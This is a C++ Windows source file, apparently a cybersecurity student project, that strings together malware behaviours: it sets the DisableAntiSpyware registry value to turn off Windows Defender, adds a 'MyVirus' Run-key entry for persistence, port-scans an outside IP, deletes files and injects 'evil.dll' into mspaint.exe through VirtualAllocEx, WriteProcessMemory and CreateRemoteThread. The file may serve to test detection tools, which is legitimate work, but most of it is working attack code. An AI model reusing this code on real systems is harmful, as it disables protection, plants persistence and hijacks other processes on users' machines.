// Importing the required moduldes
#include <windows.h>
#include <iostream>
#include <map>
#include <string>
#include <cstring>
#include <vector>
#include <iterator>
#include <algorithm>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <cstring>
#include <sstream>
#include <winsock.h>
#include <tlhelp32.h>
#include <mutex>
#include <thread>
#include <queue>
using std::ostringstream;
using std::ends;
#pragma comment(lib, "ws2_32.lib")

// Path to the evil DLL file
char evilDLL[] = "E:\\Cyber\\YB_CYBER\\project\\FinalProject\\ExeFiles\\ExeFiles\\evil.dll";
unsigned int evilLen = sizeof(evilDLL) + 1;

// Queue to store port numbers for scanning
std::queue<int> port_queue;
std::mutex mut;


DWORD port_scanner(int port, char* ip) {
    /**
    * Performs port scanning on a specified IP address and port number using Winsock.
    * @param port The port number to scan.
    * @param ip The IP address to connect to.
    * @return The result of the port scanning operation.
    */
    WSADATA wsa;

    printf("\nInitialising Winsock...");
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        printf("Failed. Error Code : %d", WSAGetLastError());
        return 1;
    }

    printf("Initialised.\n");

    SOCKET s;
    struct sockaddr_in sock;

    // Create a socket
    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
    {
        printf("Could not create socket : %d", WSAGetLastError());
    }

    printf("Socket created.\n");


    sock.sin_addr.s_addr = inet_addr(ip);
    sock.sin_family = AF_INET;
    sock.sin_port = htons(port);

    // Connect to remote server
    int iResult = connect(s, (struct sockaddr*)&sock, sizeof(sock));
    if (iResult == SOCKET_ERROR)
    {
        std::cout << "No success :( in connecting to port " << port << std::endl;
    }
    else {
        std::cout << "Succcess :) Connected to port " << port << std::endl;
    }
    return 0;
}


void run() {
    /**
    * Performs port scanning by dequeuing ports from the port_queue and calling the port_scanner function.
    */
    //mut.lock();
    while (!port_queue.empty()) {
        int port = port_queue.front();
        port_scanner(port, (char*)"142.250.186.68");
        port_queue.pop();
    }
    //mut.unlock();
}


DWORD FindProcessId(const std::wstring& processName)
{
    /**
    * Finds the process ID (PID) of a specified process name.
    * @param processName The name of the process.
    * @return The process ID (PID) of the specified process, or 0 if not found.
    */
    PROCESSENTRY32 processInfo;
    processInfo.dwSize = sizeof(processInfo);

    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (processesSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    Process32First(processesSnapshot, &processInfo);
    if (!processName.compare(processInfo.szExeFile))
    {
        //CloseHandle(processesSnapshot);
        return processInfo.th32ProcessID;
    }

    while (Process32Next(processesSnapshot, &processInfo))
    {
        if (!processName.compare(processInfo.szExeFile))
        {
            //CloseHandle(processesSnapshot);
            return processInfo.th32ProcessID;
        }
    }

    //CloseHandle(processesSnapshot);
    return 0;
}


int CreateSocket()
{
    /**
    * Creates a socket and connects to a remote server.
    * @return The result of the socket creation and connection.
    */
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    const char* message;
    int recv_size;
    char server_reply[3000] = { 0 };

    printf("\nInitialising Winsock...");
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        printf("Failed. Error Code : %d", WSAGetLastError());
        return 1;
    }

    printf("Initialised.\n");

    // Create a socket
    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
    {
        printf("Could not create socket : %d", WSAGetLastError());
    }

    printf("Socket created.\n");


    server.sin_addr.s_addr = inet_addr("142.250.186.68");
    server.sin_family = AF_INET;
    server.sin_port = htons(80);
     
    // Connect to remote server
    if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0)
    {
        puts("connect error");
        return 1;
    }

    puts("Connected");

    // Send some data
    message = "GET / HTTP/1.1\r\n\r\n";
    if (send(s, message, strlen(message), 0) < 0)
    {
        puts("Send failed");
        return 1;
    }
    puts("Data Sent\n");

    // Receive a reply from the server
    if ((recv_size = recv(s, server_reply, 2000, 0)) == SOCKET_ERROR)
    {
        puts("recv failed");
    }

    puts("Reply received\n");

    //Add a NULL terminating character to make it a proper string before printing
    //server_reply[recv_size] = '\0';

    return 0;

}


int main()
{
    /**
    * The main function of the function
    * including File, Registry, DLL Injection operations
    * @return None
    */

    // Sleep and create file
    Sleep(2000);
    HANDLE hFile = CreateFileA("C:\\Program Files\\evil.cpp",                // name of the write
        GENERIC_WRITE,          // open for writing
        0,                      // do not share
        NULL,                   // default security
        CREATE_NEW,             // create new file only
        FILE_ATTRIBUTE_NORMAL,  // normal file
        NULL);                  // no attr. template

    if (!(hFile == INVALID_HANDLE_VALUE)) {
        DWORD err = GetLastError();
        std::cout << "err " << err << std::endl;
        printf("Could not open file\n");
    }
    else
        printf("Successfully opened file\n");

    // Allocate space
    LPVOID address = VirtualAlloc(NULL, 11, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    hFile = CreateFileA("evil.txt",                // name of the write
        GENERIC_WRITE,          // open for writing
        0,                      // do not share
        NULL,                   // default security
        CREATE_NEW,             // create new file only
        FILE_ATTRIBUTE_NORMAL,  // normal file
        NULL);                  // no attr. template

    if (!(hFile == INVALID_HANDLE_VALUE))
        printf("Could not open file\n");
    else
        printf("Successfully opened file\n");

    address = VirtualAlloc(NULL, 11, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    //CreateThread(NULL, NULL, NULL, NULL, NULL, NULL);
    //CreateThread(NULL, NULL, NULL, NULL, NULL, NULL);

    // Try to Disable the windows defender through registry.
    HKEY key;
    HKEY new_key;
    DWORD disable = 1;
    LONG res = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_ALL_ACCESS, &key);
    RegSetValueExA(key, "DisableAntiSpyware", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
    RegCreateKeyExA(key, "Real-Time Protection", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &new_key, 0);



    // adding calling process to run
    //HKEY hOpened;
    //char pPath[100];
    //GetModuleFileNameA(0, pPath, 100);
    //RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hOpened);

    // Path to virus
    HKEY hKey;
    char pPath[100];
    char exePath[] = "D:\\Cyber\\YB_CYBER\\project\\FinalProject\\c_sharp_exe\\regular_exe\\regular_exe\\bin\\x86\\Debug\\virus.exe";

    // Get the path of the current executable
    GetModuleFileNameA(NULL, pPath, sizeof(pPath));

    // Create a key "MyVirus" in a Run Key and add tthe exePath to it
    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey);
    RegSetValueExA(hKey, "MyVirus", 0, REG_SZ, (BYTE*)exePath, strlen(exePath) + 1);

    // Try to read SystemRoot value
    // The "SystemRoot" registry key typically contains the path to the Windows installation directory on the system.
    char value[255];
    DWORD BufferSize = 8192;
    RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "SystemRoot", RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);

    // Activate Port Scanning
    for (size_t i = 80; i <= 82; i++)
    {
        port_queue.push(i);
    }
    run();

    // Create the Socket
    int zero = CreateSocket();

    // Trying to delete a file
    if (DeleteFileA("E:\\Cyber\\YB_CYBER\\project\\FinalProject\\De_Bug\\De_Bug\\hello.txt") != 0)
        printf("success in deleting hello.txt");

    // Write data to the file
    std::string strText = "Hello World!"; // For C use LPSTR (char*) or LPWSTR (wchar_t*)
    //DWORD bytesWritten;
    OVERLAPPED  ov{ 0 };
    LPOVERLAPPED_COMPLETION_ROUTINE l{ 0 };
    WriteFileEx(
        hFile,            // Handle to the file
        strText.c_str(),  // Buffer to write
        strText.size(),   // Buffer size
        &ov, // Overlapped
        l);

    WriteFile(hFile, strText.c_str(), strText.size(), NULL, NULL);

    // Dll injection
    DWORD pid = 0; // process ID
    HANDLE ph; // process handle
    HANDLE rt; // remote thread
    LPVOID rb; // remote buffer

    // Handle to kernel32 and pass it to GetProcAddress
    HMODULE hKernel32 = GetModuleHandle(L"Kernel32");
    VOID* lb = GetProcAddress(hKernel32, "LoadLibraryA");

    // Get process ID by name
    pid = FindProcessId(L"mspaint.exe");
    if (pid == 0) {
        printf("PID not found :( exiting...\n");
        return -1;
    }
    else {
        printf("PID = %d\n", pid);
    }

    // Open process
    ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));

    // Allocate memory buffer for remote process
    rb = VirtualAllocEx(ph, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

    // "Copy" evil DLL between processes
    WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);

    // Our process start new thread
    rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
    if (!rt) {
        DWORD err = GetLastError();
        std::cout << err << std::endl;
    }
    CloseHandle(ph);

    return 0;

}